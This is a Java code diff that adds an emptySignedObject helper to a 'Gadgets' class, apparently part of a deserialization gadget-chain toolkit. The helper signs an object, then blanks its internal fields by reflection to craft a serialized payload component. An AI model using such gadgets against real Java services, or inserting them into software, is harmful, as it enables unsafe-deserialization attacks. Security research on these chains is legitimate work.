@@ -14,6 +14,7 @@ import java.lang.reflect.Proxy;
 import java.net.URL;
 import java.nio.file.Files;
 import java.nio.file.Paths;
+import java.security.*;
 import java.util.Base64;
 import java.util.HashMap;
 import java.util.Map;
@@ -180,5 +181,25 @@ public class Gadgets {
         Array.set(tbl, 1, nodeCons.newInstance(0, v2, v2, null));
         Reflections.setFieldValue(s, "table", tbl);
         return s;
+    }
+    public static SignedObject emptySignedObject() throws Exception{
+        KeyPairGenerator keyGen = KeyPairGenerator.getInstance("DSA", "SUN");
+        SecureRandom random = SecureRandom.getInstance("SHA1PRNG", "SUN");
+        keyGen.initialize(1024, random);
+        // create a private key
+        PrivateKey signingKey = keyGen.generateKeyPair().getPrivate();
+        // create a Signature
+        Signature signingEngine = Signature.getInstance("DSA");
+        signingEngine.initSign(signingKey);
+        // create a simple object
+        Serializable obj = new String("John");
+        // sign our object
+        SignedObject signedObject = new SignedObject(obj, signingKey, signingEngine);
+
+        Reflections.setFieldValue(signedObject,"thealgorithm","");
+        Reflections.setFieldValue(signedObject,"signature",new byte[]{});
+        Reflections.setFieldValue(signedObject,"content",new byte[]{});
+
+        return signedObject;
     }
 }
